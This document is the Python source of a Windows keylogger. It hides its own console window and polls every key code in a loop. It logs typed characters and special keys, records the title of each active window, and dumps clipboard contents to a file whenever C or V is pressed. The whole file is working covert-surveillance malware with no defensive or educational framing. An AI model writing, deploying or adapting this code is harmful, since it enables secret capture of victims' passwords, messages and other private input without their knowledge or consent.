import ctypes
import logging

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)


def grab_current_window():  # Determine active window title for logging

    get_foreground_window = user32.GetForegroundWindow
    get_window_text_length = user32.GetWindowTextLengthW
    get_window_text = user32.GetWindowTextW

    hwnd = get_foreground_window()
    length = get_window_text_length(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)

    get_window_text(hwnd, buff, length, +1)

    return buff.value


def capture_clipboard():  # Grabs contents of the clipboard

    cf_unicode_text = 13

    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)

    is_clipboard_format_available = user32.IsClipboardFormatAvailable
    get_clipboard_data = user32.GetClipboardData
    close_clipboard = user32.CloseClipboard

    try:
        if is_clipboard_format_available(cf_unicode_text):
            data = get_clipboard_data(cf_unicode_text)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            return value.decode("utf-8")
    finally:  # Ensure the clipboard closes regardless of unhandled exceptions so the logger can function
        close_clipboard()


def log_keystrokes(log_dir, log_name):  # Monitor and log all keystrokes from the current active window

    logging.basicConfig(filename=(log_dir + "\\" + log_name), level=logging.DEBUG, format='%(asctime)s - %(message)s',
                        datefmt='%d-%b-%y %H:%M:%S')

    get_async_key_state = user32.GetAsyncKeyState  # Determine if key is depressed or not (for shift, caps, etc)
    special_function_keys = {0x08: 'Backspace', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock',
                             0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = []  # Store any typed characters

    while True:
        if current_window != grab_current_window():  # Text to title for the current window and write to log file
            current_window = grab_current_window()
            logging.info(str(current_window).encode("utf-8"))

        for i in range(1, 256):
            if get_async_key_state(i) & 1:
                if i in special_function_keys:
                    logging.info("<{}>".format(special_function_keys[i]))
                elif i == 0x0d:  # If 'ENTER' key is pressed, log the line and then clear the line variable
                    logging.info(line)
                    line.clear()
                elif i == 0x43 or i == 0x56:  # If 'C' or 'V' pressed, capture the clipboard
                    clipboard_data = capture_clipboard()
                    logging.info("[CLIPBOARD] {}".format(clipboard_data))
                elif 0x30 <= i <= 0x5a:  # If 'A-Z/0-9', append to line
                    line.append(chr(i))
